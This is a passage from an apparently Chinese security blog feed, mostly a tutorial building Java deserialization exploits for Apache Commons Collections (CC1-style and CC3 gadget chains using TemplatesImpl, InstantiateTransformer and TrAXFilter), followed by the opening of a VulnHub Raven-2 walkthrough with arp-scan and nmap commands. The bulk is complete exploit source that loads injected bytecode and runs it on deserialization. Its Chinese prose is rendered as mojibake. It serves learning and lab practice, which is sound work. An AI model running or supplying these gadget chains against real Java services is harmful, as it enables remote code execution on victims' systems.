bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//        templates.newTransformer();  </span></span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line"><span class="comment">//        chainedTransformer.transform(1);  </span></span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap,  chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class.class, Map.class&#125;);  </span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);  </span><br><span class="line">        <span class="comment">//InvocationHandlerè§£å†³proxyMapä¸èƒ½åºåˆ—åŒ–ï¼Œç„¶åé€šè¿‡æ„é€ æ–¹æ³•å°†ä»£ç†å¯¹è±¡proxyMapèµ‹å€¼ç»™memberValues  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//åºåˆ—åŒ–ä¸ååºåˆ—åŒ–  </span></span><br><span class="line"><span class="comment">//        serialize(invocationHandler);  </span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031736820.png" alt="image-20230603173603684"><br>ç›®å‰çš„æµç¨‹å›¾å¦‚ä¸‹<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031736425.png" alt="image-20230603173633352"><br>CC6å’Œè¿™ä¸ªä¹Ÿå·®ä¸å¤šçš„ä¹Ÿèƒ½é€š</p><h2 id="ç»§ç»­åˆ†æCC3"><a href="#ç»§ç»­åˆ†æCC3" class="headerlink" title="ç»§ç»­åˆ†æCC3"></a>ç»§ç»­åˆ†æCC3</h2><p>ç°åœ¨æˆ‘ä»¬å·²ç»æ‰¾åˆ°äº†å‘½ä»¤æ‰§è¡Œçš„ç±»å’Œæ–¹æ³•ä¹Ÿå°±æ˜¯<code>TemplatesImpl.newTransformer()</code>å‰é¢æ˜¯å’ŒCC1çš„å‰åŠéƒ¨åˆ†é“¾èµ·æ¥çš„ç›¸å½“äºå¦‚æœè¿‡æ»¤äº†<code>Runtime.exec()</code>é‚£å°±å¯ä»¥æ¢ç§æ–¹æ³•æ¥æ‰§è¡Œä»£ç ï¼Œå¦‚æœè¿‡æ»¤äº†<code>InvokerTransform.transform</code>å‘¢ï¼Ÿä¹Ÿæ˜¯æœ‰åˆ«çš„é“¾æ¥åˆ°å‘½ä»¤æ‰§è¡Œçš„ï¼Œè¿™å°±æ˜¯CC3ï¼Œæ‰€ä»¥æˆ‘ä»¬ç»§ç»­ä½¿ç”¨find usageså¾€å‰æ‰¾ï¼Œæœ€ç»ˆæ‰¾åˆ°äº†TrAXFilterè¿™ä¸ªç±»<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031736796.png" alt="image-20230603173655608"><br>è¿™ä¸ªç±»ä¹Ÿæ˜¯ä¸èƒ½åºåˆ—åŒ–çš„æ²¡åŠæ³•ä¼ å‚(å…¶å®è¿™é‡Œæœ‰ç‚¹ä¸å¤ªæ˜ç™½ä¸èƒ½ä¼ å‚æ„å‘³ç€ä»€ä¹ˆ)ï¼Œé‚£ä¹ˆåªèƒ½ä»æ„é€ æ–¹æ³•å…¥æ‰‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_transformer = (TransformerImpl) templates.newTransformer();</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åªè¦æ‰§è¡Œäº†æ„é€ æ–¹æ³•å°±èƒ½åˆ°<code>newTransformer()</code>å‘½ä»¤æ‰§è¡Œï¼Œåœ¨è¿™é‡ŒCC3ä½œè€…è°ƒç”¨äº†ä¸€ä¸ªæ–°çš„ç±»<code>InstantiateTransformer</code>æˆ‘ä»¬å»çœ‹ä¸€ä¸‹å®ƒçš„<code>transform</code>æ–¹æ³•<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031737397.png" alt="image-20230603173706325"><br>è¿™æ ·å°±åˆšåˆšå¥½ç¬¦åˆéœ€æ±‚ç„¶åæ„é€ EXP</p><h2 id="CC3-EXP"><a href="#CC3-EXP" class="headerlink" title="CC3 EXP"></a>CC3 EXP</h2><p>é€šè¿‡<code>InstantiateTransformer</code>æ¥è°ƒç”¨<code>TrAXFilter</code>ç±»çš„æ„é€ æ–¹æ³•è§£å†³å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);  </span><br><span class="line">instantiateTransformer.transform(TrAXFilter.class);</span><br></pre></td></tr></table></figure><p>æµ‹è¯•æˆåŠŸï¼Œç„¶åä½¿ç”¨CC1çš„å‰åŠéƒ¨åˆ†å»è°ƒtransformæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);  </span><br><span class="line"><span class="comment">//        instantiateTransformer.transform(TrAXFilter.class);  </span></span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap,  instantiateTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class.class, Map.class&#125;);  </span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);  </span><br><span class="line">        invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);  </span><br><span class="line">        <span class="comment">//InvocationHandlerè§£å†³proxyMapä¸èƒ½åºåˆ—åŒ–ï¼Œç„¶åé€šè¿‡æ„é€ æ–¹æ³•å°†ä»£ç†å¯¹è±¡proxyMapèµ‹å€¼ç»™memberValues  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//åºåˆ—åŒ–ä¸ååºåˆ—åŒ–  </span></span><br><span class="line"><span class="comment">//        serialize(invocationHandler);  </span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å‘ç°åœ¨ååºåˆ—åŒ–çš„æ—¶å€™æŠ¥é”™ï¼Œè¿™é‡Œè¿˜æ˜¯CC1çš„<code>setValue()</code> çš„ä¼ å‚æ— æ³•æ§åˆ¶ï¼Œéœ€è¦å¼•å…¥ <code>Transformer</code> ä¸ <code>ChainedTransformer</code> è¾…åŠ©ï¼Œæ”¹äº†åçš„EXPå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//        templates.newTransformer();  </span></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),  </span><br><span class="line">                instantiateTransformer  </span><br><span class="line">        &#125;;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap,  chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class.class, Map.class&#125;);  </span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);  </span><br><span class="line">        <span class="comment">//InvocationHandlerè§£å†³proxyMapä¸èƒ½åºåˆ—åŒ–ï¼Œç„¶åé€šè¿‡æ„é€ æ–¹æ³•å°†ä»£ç†å¯¹è±¡proxyMapèµ‹å€¼ç»™memberValues  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//åºåˆ—åŒ–ä¸ååºåˆ—åŒ–  </span></span><br><span class="line"><span class="comment">//        serialize(invocationHandler);  </span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031737151.png" alt="image-20230603173731054"><br>é“¾å­ç»“æŸã€‚è·Ÿå®Œå‘ç°è‡ªå·±å¯¹äºCC1çš„ç†è§£è¿˜æ˜¯ä¸å¤Ÿé€å½»ï¼Œå¾—å»å¤ä¹ ä¸€ä¸‹äº†ï¼ŒCCé“¾è¿™ä¸€å—è¿˜æ˜¯å¾ˆé‡è¦ï¼Œå¯¹äºåç»­å…¶å®ƒçš„é“¾å­¦ä¹ ç®—æ˜¯æ‰“ä¸‹åŸºç¡€</p><h2 id="æµç¨‹å›¾"><a href="#æµç¨‹å›¾" class="headerlink" title="æµç¨‹å›¾"></a>æµç¨‹å›¾</h2><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031737924.png" alt="image-20230603173740854"><br>è¿™æ¡é“¾å­å°±ç›¸å½“äºç»™äº†å‘½ä»¤æ‰§è¡Œçš„å¦ä¸€ç§æ–¹æ³•ï¼Œå¦‚æœ<code>InvokerTransform</code>å’Œ<code>Runtime</code>è¢«åŠäº†å°±å¯ä»¥ç”¨è¿™ä¸€æ¡æ¥ç»•è¿‡</p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub-Raven-2</title>
      <link href="/undefined/8725.html"/>
      <url>/undefined/8725.html</url>
      
        <content type="html"><![CDATA[<h2 id="é¶æœºåœ°å€"><a href="#é¶æœºåœ°å€" class="headerlink" title="é¶æœºåœ°å€"></a>é¶æœºåœ°å€</h2><p><code>https://www.vulnhub.com/entry/raven-2,269/</code></p><h2 id="flagâ€”1"><a href="#flagâ€”1" class="headerlink" title="flagâ€”1"></a>flagâ€”1</h2><p>æ‰«æå­˜æ´»ä¸»æœº<br><code>arp-scan -l</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301511958.png" alt="image-20230530151117902"><br>é€šè¿‡é¶æœºmacåœ°å€åˆ¤æ–­IPä¸º<code>192.168.75.135</code>ç„¶ånmapæ‰«ä¸€ä¸‹ï¼Œçœ‹çœ‹å¼€æ”¾ç«¯å£<br><code>nmap -A -p- -v  192.168.75.135</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301511132.png" alt="image-20230530151136092"><br>ä¸‰ä¸ªå¼€æ”¾ç«¯å£ï¼Œç„¶ådirsearchæ‰«ä¸€ä¸‹ç›®å½•<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301511273.png" alt="image-20230530151147237"><br>è®¿é—®&#x2F;vendorå­˜åœ¨ä¸€ä¸ªç›®å½•éå†æ¼æ´ï¼Œåœ¨PATHä¸‹æ‰¾åˆ°flag1<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301512438.png" alt="image-20230530151208411"></p><h2 id="flagâ€”2ï¼Œ3"><a href="#flagâ€”2ï¼Œ3" class="headerlink" 